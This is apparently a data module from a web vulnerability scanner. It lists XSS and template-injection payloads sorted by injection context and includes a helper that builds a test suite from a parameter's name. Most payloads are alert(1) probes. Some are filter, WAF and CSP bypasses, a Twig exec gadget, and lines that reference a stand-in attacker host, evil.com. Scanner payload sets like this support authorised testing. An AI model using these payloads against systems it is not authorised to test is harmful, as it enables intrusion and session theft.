"""Payload sets for the XSS detector — per injection context.

Extracted from ``titan/modules/xss/detector.py``. Pure data plus one pure
suite-builder; no engine state is read here.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Payload sets — per injection context
# ---------------------------------------------------------------------------

# Context 1: HTML tag injection (breaks out of text node or tag attribute value)
_HTML_TAG_PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<<script>alert(1)//<</script>",  # double-bracket parser confusion
    "<scr\x00ipt>alert(1)</scr\x00ipt>",  # null-byte WAF bypass
    "<scr\nipt>alert(1)</scr\nipt>",  # newline bypass
    "<IMG SRC=x OnErRoR=alert(1)>",  # case mutation
    '<img src="x" onerror="alert(1)">',
    '<iframe srcdoc="<script>alert(1)</script>">',
    "<math><mtext></table></math><img src=x onerror=alert(1)>",  # HTML5 parser confusion
)

# Context 2: Attribute breakout (inject into value="..." to escape into event handler)
_ATTR_BREAKOUT_PAYLOADS: tuple[str, ...] = (
    '" onmouseover="alert(1)',
    '" onfocus="alert(1)" autofocus="',
    '" onerror="alert(1)" src="x',
    "' onmouseover='alert(1)",
    "' onfocus='alert(1)' autofocus='",
    '" autofocus onfocus=alert(1) x="',
    '" style="animation-name:x" onanimationstart="alert(1)',
    '"><script>alert(1)</script>',
    "'\"><svg onload=alert(1)>",
    '" tabindex=1 onfocus=alert(1) autofocus x="',
)

# Context 3: JavaScript string breakout (inject into var x = "..." or var x = '...')
_JS_STRING_PAYLOADS: tuple[str, ...] = (
    "'-alert(1)-'",
    '"-alert(1)-"',
    "';alert(1)//",
    '";alert(1)//',
    "\\';alert(1)//",
    "\\x27;alert(1)//",
    "</script><script>alert(1)</script>",
    "${alert(1)}",  # template literal
    "`${alert(1)}`",  # template literal alt
    "\\u0022;alert(1)//",  # unicode escape
)

# Context 4: Client-Side Template Injection (AngularJS, Vue, React, Freemarker)
_CSTI_PAYLOADS: tuple[str, ...] = (
    "{{7*7}}",  # math oracle
    "{{constructor.constructor('alert(1)')()}}",  # AngularJS sandbox escape
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",  # Twig
    "${7*7}",  # Spring EL / Freemarker
    "#{7*7}",  # Thymeleaf
    "*{7*7}",  # Thymeleaf selection
    "{7*7}",  # generic
    "{{alert(1)}}",  # Vue-style
    "%7B%7Balert(1)%7D%7D",  # URL-encoded
)

# Context 5: Header-reflected XSS (Referer, User-Agent stored/reflected)
_HEADER_XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '" onmouseover="alert(1)',
    "'-alert(1)-'",
)

_INJECTABLE_HEADERS_XSS: tuple[str, ...] = (
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "Origin",
    "X-Custom-Header",
)

# WAF bypass variants (applied on top of each context set)
_WAF_BYPASS_VARIANTS: tuple[str, ...] = (
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script/x>alert(1)</script>",
    "<img/src=x onerror=alert(1)>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entity encoded
    "\u003cscript\u003ealert(1)\u003c/script\u003e",  # unicode escape
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # URL encoded
    "<script>/*</script><script>*/alert(1)</script>",  # comment split
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<div/onmouseover='alert(1)'>text</div>",
    "<a/href=javascript:alert(1)>click",
    "javascript:alert(1)",  # href / action / src sinks
    "data:text/html,<script>alert(1)</script>",
)

# Context 7: DOM sink payloads (location.hash, document.URL, document.referrer,
# localStorage, sessionStorage, eval, setTimeout, setInterval, onerror handlers)
_DOM_SINK_PAYLOADS: tuple[str, ...] = (
    # location.hash / document.URL sinks
    "javascript:alert(1)",
    "javascript:alert(1)//",
    "javascript:alert(1)%00",
    "javascript:alert(1)%0a",
    # localStorage/sessionStorage sinks (sinks that eval/storage-followed values)
    'x" onerror="alert(1)',
    "x' onerror='alert(1)",
    'x" onclick="alert(1)',
    "x' onclick='alert(1)",
    # eval / setTimeout / setInterval sinks
    "';alert(1)//",
    '";alert(1)//',
    "');alert(1)//",
    '");alert(1)//',
    # WebSocket / postMessage sink payloads
    "<img src=x onerror=alert(1)>",
    "eval(alert(1))",
    "setTimeout(alert(1),0)",
    "setInterval(alert(1),0)",
    # CSS expression / behavior sinks (IE legacy)
    'x" expression\\alert(1)//',
    "x\" -moz-binding:url('http://evil.com/xss.xml#xss')//",
    # SVG-based sinks
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x to='y'>",
    # MathML sinks
    "<math><mtext></mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    # XML namespace confusion
    "<xml ID=x><y><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://evil.com'>]><x>&xxe;</x></y></xml><img src=x onerror=alert(1)>",
)

# Context 8: CSP bypass payloads (nonce bypass, JSONP, inline handlers, style-src)
_CSP_BYPASS_PAYLOADS: tuple[str, ...] = (
    # JSONP callback bypass (script-src 'nonce-xxx' allows JSONP if endpoint lacks CORS)
    "?callback=<script>alert(1)</script>",
    "?jsonp=<script>alert(1)</script>",
    # AngularJS sandbox escape via CSP nonce-whitelisted inline
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}alert(1)//');}}",
    # DOM-based CSP bypass via base-uri
    "<base href='javascript://alert(1)//'>",
    # Style-src bypass via expression (IE)
    '<div style="width: expression(alert(1));">',
    # Font-face @import bypass (style-src 'self' + 'unsafe-inline' but strict-dynamic)
    "@import url('https://evil.com/evil.css');",
    # Object/data URI bypass
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
    # iframe srcdoc bypass
    '<iframe srcdoc="<script>alert(1)</script>">',
    # Form action + enctype bypass (multipart/form-data can bypass some WAFs)
    '<form action="javascript:alert(1)" enctype="text/plain"><input type="submit"></form>',
    # Blob URL + iframe bypass
    '<iframe src="javascript:alert(1)">',
    # Meta refresh + javascript: URL
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
)

# Context 9: Modern JS framework sink payloads (React, Vue, Angular, Svelte)
_FRAMEWORK_SINK_PAYLOADS: tuple[str, ...] = (
    # React: dangerouslySetInnerHTML, srcDoc, href with javascript:
    '<a href="javascript:alert(1)">click</a>',
    '<iframe srcDoc="<script>alert(1)</script>">',
    "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
    # Vue: v-html, href with javascript:
    '<div v-html="<img src=x onerror=alert(1)>" />',
    '<a href="javascript:alert(1)" @click.prevent>',
    # Angular: [innerHTML], bypass TrustedHtml if context allows
    "<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\" />",
    # Svelte: {@html}, href with javascript:
    "{@html '<img src=x onerror=alert(1)>'}",
    # Lit / fast-element: unsafeHTML
    '<div .innerHTML="<img src=x onerror=alert(1)>" />',
)


def build_context_suite(
    param_name: str, param_val: str, generic_payloads: list[str]
) -> list[str]:
    """
    Prepend the most likely context-specific payloads based on what
    we know about the parameter, then append the full generic pool.
    """
    suite: list[str] = []

    name_lower = param_name.lower()

    # Likely JS/template context (e.g. callback=, jsonp=, template=)
    if any(k in name_lower for k in ["callback", "jsonp", "template", "view", "format"]):
        suite.extend(_JS_STRING_PAYLOADS)
        suite.extend(_CSTI_PAYLOADS)

    # Likely URL/href context (redirect=, url=, next=, return=)
    elif any(k in name_lower for k in ["url", "redirect", "return", "next", "goto", "link", "href"]):
        suite.extend(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"])

    # Default: HTML tag injection first, then attribute breakouts
    else:
        suite.extend(_HTML_TAG_PAYLOADS)
        suite.extend(_ATTR_BREAKOUT_PAYLOADS)
        suite.extend(_JS_STRING_PAYLOADS)
        suite.extend(_CSTI_PAYLOADS)
        suite.extend(_DOM_SINK_PAYLOADS)
        suite.extend(_CSP_BYPASS_PAYLOADS)
        suite.extend(_FRAMEWORK_SINK_PAYLOADS)

    suite.extend(_WAF_BYPASS_VARIANTS)
    suite.extend(generic_payloads)
    return list(dict.fromkeys(suite))
